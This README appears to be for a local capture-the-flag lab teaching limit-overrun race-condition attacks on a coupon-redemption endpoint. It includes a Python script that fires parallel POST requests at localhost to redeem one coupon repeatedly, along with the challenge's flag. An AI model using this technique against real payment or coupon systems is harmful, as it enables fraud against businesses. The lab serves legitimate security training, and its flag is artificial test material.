# Race Conditions & Concurrency Attacks Lab (Limit Overrun)

## Overview

Practice exploiting Limit Overrun / TOCTOU (Time-of-Check to Time-of-Use) race conditions using Burp Suite Turbo Intruder, single-packet attack techniques, or parallel asynchronous HTTP requests (PortSwigger Web Security Academy topic 27).

- **Default Port / Access**: `http://localhost:8097`
- **Container Name**: `cyberlab_02_web_race_conditions`
- **Shortcut**: `./lab start race-condition`
- **Upstream References**:
  - [PortSwigger Web Security Academy: Race Conditions](https://portswigger.net/web-security/race-conditions)
  - [PortSwigger Research: Smashing the state machine - the true potential of web race conditions](https://portswigger.net/research/smashing-the-state-machine)

---

## Exploitation Workflow

### 1. Observe Normal Logic

Redeeming a coupon normally increments the counter to `1/1` and adds `$100`. Any subsequent click returns `400 Coupon already used`.

### 2. Concurrency Attack / Parallel HTTP Race

Reset the balance and send simultaneous requests into the race window.

Run the provided validation script:

```bash
python3 test_race.py
```

Or execute via Python:

```python
import concurrent.futures
import requests

def redeem():
    return requests.post("http://localhost:8097/redeem").json()

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    results = list(executor.map(lambda _: redeem(), range(10)))

for res in results:
    if "FLAG{" in res.get("message", ""):
        print("[+] SUCCESS:", res["message"])
```

### 3. Verify Limit Overrun

If requests land within the concurrency window before the database/state locks update, `coupons_used` will exceed 1 and the challenge will yield:

```
FLAG{TURBO_INTRUDER_RACE_PWNED}
```

---

## YouTube Walkthroughs & Solving Guides

- [Pink Boo - Limit Overrun Race Conditions (PortSwigger Academy)](https://www.youtube.com/watch?v=-2_EUSTcfx4)
- [Michael Sommer - Race Conditions: Bypassing Rate Limits with Turbo Intruder](https://www.youtube.com/watch?v=IRzeBWy76NA)
- [Infinite Logins - Limit Overrun Race Conditions Lab (PortSwigger)](https://www.youtube.com/watch?v=Zp04Gn7lsIU)

---

## Quick CLI Control

```bash
./lab start race-condition
./lab status
./lab stop race-condition
```
